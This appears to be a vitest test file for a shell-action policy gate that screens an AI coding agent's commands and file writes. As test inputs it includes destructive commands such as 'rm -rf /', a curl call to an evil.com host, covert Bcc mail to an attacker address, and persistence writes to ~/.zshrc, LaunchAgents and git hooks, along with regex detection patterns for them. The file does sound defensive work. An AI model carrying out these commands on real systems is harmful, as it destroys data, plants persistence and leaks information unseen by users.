/**
 * action-gate-shell.test.ts — Shell adapter tests
 */

import { describe, it, expect } from 'vitest';
import {
  evaluateShell,
  evaluateFileTarget,
  extractBaseCommand,
  extractAllCommands,
  loadShellPolicy,
  type ShellAction,
  type FileAction,
  type ShellPolicy,
} from './action-gate-shell';

// Ask-class patterns mirror policies/claude-code-shell.yaml (ActionGate gap #2).
const ASK_PATTERNS = [
  /\bmailx?\s+[^|&;]*-[bc]\b/,
  /[Bb][Cc][Cc]:\s*\S+@/,
  /--mail-rcpt\b/,
  /\bsmtplib\b/,
];
const PERSISTENCE_PATTERNS = [
  /(?:^|\/)\.(zshrc|zprofile|zshenv|zlogin|bashrc|bash_profile|bash_login|profile)\b/,
  /(?:~|\/Users\/[^/]+|\/home\/[^/]+)\/bin\b/,
  /Library\/LaunchAgents\b/,
  /\.git\/hooks\b/,
  /\.claude\/settings[^/]*\.json\b/,
];

function policy(overrides: Partial<ShellPolicy> = {}): ShellPolicy {
  return {
    failClosed: true,
    allowedCommands: new Set(['git', 'npm', 'node', 'npx', 'tsc', 'cat', 'ls', 'echo', 'head', 'tail', 'grep', 'wc']),
    blockedCommands: new Set(['rm', 'shutdown', 'reboot', 'mkfs', 'dd']),
    blockedPatterns: [/--force/, /--no-verify/, /rm\s+-rf/, />\s*\/dev/],
    askPatterns: [],
    persistencePathPatterns: [],
    allowedWorkingDirPrefixes: ['/Users/tim/', '/home/tim/'],
    ...overrides,
  };
}

// Blocklist-mode policy carrying the real ask + persistence patterns —
// matches the shipped claude-code-shell.yaml (fail_closed: false).
function askPolicy(overrides: Partial<ShellPolicy> = {}): ShellPolicy {
  return policy({
    failClosed: false,
    allowedWorkingDirPrefixes: [],
    askPatterns: ASK_PATTERNS,
    persistencePathPatterns: PERSISTENCE_PATTERNS,
    ...overrides,
  });
}

function action(overrides: Partial<ShellAction> = {}): ShellAction {
  return {
    kind: 'shell-exec',
    command: 'git status',
    workingDir: '/Users/tim/project',
    ...overrides,
  };
}

describe('extractBaseCommand', () => {
  it('extracts simple command', () => {
    expect(extractBaseCommand('git status')).toBe('git');
  });

  it('strips path prefix', () => {
    expect(extractBaseCommand('/usr/bin/git status')).toBe('git');
  });

  it('skips sudo', () => {
    expect(extractBaseCommand('sudo rm -rf /')).toBe('rm');
  });

  it('skips env var assignments', () => {
    expect(extractBaseCommand('FOO=bar node index.js')).toBe('node');
  });

  it('skips multiple prefixes', () => {
    expect(extractBaseCommand('sudo nice node server.js')).toBe('node');
  });
});

describe('extractAllCommands', () => {
  it('handles single command', () => {
    expect(extractAllCommands('git status')).toEqual(['git']);
  });

  it('handles && chains', () => {
    expect(extractAllCommands('git add . && git commit -m "x"')).toEqual([
      'git',
      'git',
    ]);
  });

  it('handles pipes', () => {
    expect(extractAllCommands('cat file.txt | grep foo')).toEqual([
      'cat',
      'grep',
    ]);
  });

  it('handles semicolons', () => {
    expect(extractAllCommands('ls; echo done')).toEqual(['ls', 'echo']);
  });

  it('catches $() subshells', () => {
    const cmds = extractAllCommands('echo $(whoami)');
    expect(cmds).toContain('whoami');
  });
});

describe('evaluateShell', () => {
  describe('happy path', () => {
    it('allows a simple allowed command', () => {
      const v = evaluateShell(action(), policy());
      expect(v.decision).toBe('allow');
    });

    it('allows chained allowed commands', () => {
      const v = evaluateShell(
        action({ command: 'git add . && git commit -m "test"' }),
        policy(),
      );
      expect(v.decision).toBe('allow');
    });
  });

  describe('working directory', () => {
    it('denies commands outside allowed directories', () => {
      const v = evaluateShell(
        action({ workingDir: '/etc/system' }),
        policy(),
      );
      expect(v.decision).toBe('deny');
      expect(v.rule).toBe('working-dir-not-allowed');
    });

    it('skips dir check when no prefixes configured', () => {
      const v = evaluateShell(
        action({ workingDir: '/anywhere' }),
        policy({ allowedWorkingDirPrefixes: [] }),
      );
      expect(v.decision).toBe('allow');
    });
  });

  describe('blocked patterns', () => {
    it('denies --force', () => {
      const v = evaluateShell(
        action({ command: 'git push --force' }),
        policy(),
      );
      expect(v.decision).toBe('deny');
      expect(v.rule).toBe('blocked-pattern');
    });

    it('denies --no-verify', () => {
      const v = evaluateShell(
        action({ command: 'git commit --no-verify -m "x"' }),
        policy(),
      );
      expect(v.decision).toBe('deny');
      expect(v.rule).toBe('blocked-pattern');
    });

    it('denies rm -rf', () => {
      const v = evaluateShell(
        action({ command: 'rm -rf /tmp/stuff' }),
        policy(),
      );
      expect(v.decision).toBe('deny');
      expect(v.rule).toBe('blocked-pattern');
    });
  });

  describe('blocked commands', () => {
    it('denies rm even without -rf', () => {
      const v = evaluateShell(action({ command: 'rm file.txt' }), policy());
      expect(v.decision).toBe('deny');
      expect(v.rule).toBe('blocked-command');
    });

    it('denies blocked command in a chain', () => {
      const v = evaluateShell(
        action({ command: 'echo hi && shutdown -h now' }),
        policy(),
      );
      expect(v.decision).toBe('deny');
      expect(v.rule).toBe('blocked-command');
    });
  });

  describe('fail-closed mode', () => {
    it('denies unknown commands when fail_closed is true', () => {
      const v = evaluateShell(
        action({ command: 'curl https://evil.com' }),
        policy(),
      );
      expect(v.decision).toBe('deny');
      expect(v.rule).toBe('command-not-in-allowlist');
    });

    it('allows unknown commands when fail_closed is false', () => {
      const v = evaluateShell(
        action({ command: 'curl https://api.example.com' }),
        policy({ failClosed: false }),
      );
      expect(v.decision).toBe('allow');
    });
  });

  describe('first-deny-wins ordering', () => {
    it('reports working-dir denial before command checks', () => {
      const v = evaluateShell(
        action({ workingDir: '/etc', command: 'rm -rf /' }),
        policy(),
      );
      expect(v.rule).toBe('working-dir-not-allowed');
    });

    it('reports blocked-pattern before blocked-command', () => {
      const v = evaluateShell(
        action({ command: 'rm -rf /tmp' }),
        policy(),
      );
      expect(v.rule).toBe('blocked-pattern');
    });
  });
});

describe('ask class — hidden recipients (ActionGate gap #2)', () => {
  it('mail -b (bcc recipient) -> ask', () => {
    const v = evaluateShell(
      action({
        command:
          'echo body | mail -b attacker@example.invalid victim@example.invalid',
      }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('ask-pattern');
  });

  it('sendmail with a Bcc: header -> ask', () => {
    const v = evaluateShell(
      action({
        command:
          "printf 'To: a@example.invalid\\nBcc: attacker@example.invalid\\n\\nhi' | sendmail -t",
      }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('ask-pattern');
  });

  it('curl --mail-rcpt (covert SMTP recipient) -> ask', () => {
    const v = evaluateShell(
      action({
        command:
          'curl --mail-rcpt attacker@example.invalid --mail-from me@example.invalid smtp://localhost',
      }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('ask-pattern');
  });

  it('python smtplib send -> ask', () => {
    const v = evaluateShell(
      action({
        command: 'python3 -c "import smtplib; s=smtplib.SMTP(\'localhost\')"',
      }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('ask-pattern');
  });

  it('plain git/npm commands still allow (no false positive)', () => {
    expect(evaluateShell(action({ command: 'git status' }), askPolicy()).decision).toBe('allow');
    expect(evaluateShell(action({ command: 'npm run build' }), askPolicy()).decision).toBe('allow');
    expect(
      evaluateShell(action({ command: 'echo "mailto:me@example.invalid"' }), askPolicy()).decision,
    ).toBe('allow');
  });
});

describe('ask class — persistence surfaces (ActionGate gap #2)', () => {
  it('append to ~/.zshrc -> ask', () => {
    const v = evaluateShell(
      action({ command: "echo 'export PATH=/tmp/evil:$PATH' >> ~/.zshrc" }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });

  it('copy into ~/Library/LaunchAgents -> ask', () => {
    const v = evaluateShell(
      action({
        command:
          'cp payload.plist ~/Library/LaunchAgents/com.attacker.agent.plist',
      }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });

  it('deny still wins over ask: rm -rf ~ -> deny', () => {
    const v = evaluateShell(action({ command: 'rm -rf ~' }), askPolicy());
    expect(v.decision).toBe('deny');
  });
});

describe('evaluateFileTarget — persistence-sensitive write targets', () => {
  function fileAction(overrides: Partial<FileAction> = {}): FileAction {
    return {
      kind: 'file-write',
      filePath: '/Users/tim/project/src/index.ts',
      workingDir: '/Users/tim/project',
      ...overrides,
    };
  }

  it('writing a normal project file -> allow', () => {
    const v = evaluateFileTarget(fileAction(), askPolicy());
    expect(v.decision).toBe('allow');
    expect(v.rule).toBe('file-target-ok');
  });

  it('editing ~/.bashrc -> ask', () => {
    const v = evaluateFileTarget(
      fileAction({ filePath: '/Users/tim/.bashrc' }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });

  it('writing into .git/hooks -> ask', () => {
    const v = evaluateFileTarget(
      fileAction({ filePath: '/Users/tim/project/.git/hooks/pre-commit' }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });

  it('writing ~/.claude/settings.json -> ask', () => {
    const v = evaluateFileTarget(
      fileAction({ filePath: '/Users/tim/.claude/settings.json' }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });

  it('writing into ~/bin -> ask', () => {
    const v = evaluateFileTarget(
      fileAction({ filePath: '/Users/tim/bin/helper' }),
      askPolicy(),
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });
});

describe('loadShellPolicy', () => {
  it('loads a valid YAML doc', () => {
    const p = loadShellPolicy({
      version: 1,
      adapter: 'shell',
      fail_closed: true,
      allowed_commands: ['git', 'npm'],
      blocked_commands: ['rm'],
      blocked_patterns: ['--force'],
      allowed_working_dir_prefixes: ['/home/tim/'],
    });
    expect(p.failClosed).toBe(true);
    expect(p.allowedCommands).toEqual(new Set(['git', 'npm']));
    expect(p.blockedCommands).toEqual(new Set(['rm']));
    expect(p.blockedPatterns).toHaveLength(1);
    expect(p.allowedWorkingDirPrefixes).toEqual(['/home/tim/']);
  });

  it('defaults fail_closed to true', () => {
    const p = loadShellPolicy({
      version: 1,
      adapter: 'shell',
    });
    expect(p.failClosed).toBe(true);
  });

  it('throws on wrong version', () => {
    expect(() =>
      loadShellPolicy({ version: 2, adapter: 'shell' }),
    ).toThrow('unsupported policy version');
  });
});
